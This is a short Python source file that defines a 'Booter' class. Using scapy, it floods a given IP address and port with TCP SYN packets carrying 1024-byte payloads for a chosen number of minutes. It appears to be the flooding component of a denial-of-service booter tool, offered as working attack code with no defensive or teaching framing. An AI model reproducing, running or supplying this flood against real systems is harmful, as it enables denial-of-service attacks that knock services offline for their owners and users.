import time
import scapy.all as scapy

class Booter():
    def boot(self, boot_data):
        if isinstance(boot_data, dict):
            t_end = time.time() + 60 * int(boot_data["duration"])
            while time.time() < t_end:
                print(1)
                target_ip = boot_data["ip"]
                target_port = int(boot_data["port"])

                ip = scapy.IP(dst=target_ip)
                tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
                raw = scapy.Raw(b"X"*1024)
                p = ip / tcp / raw

                scapy.send(p, loop=0, verbose=0)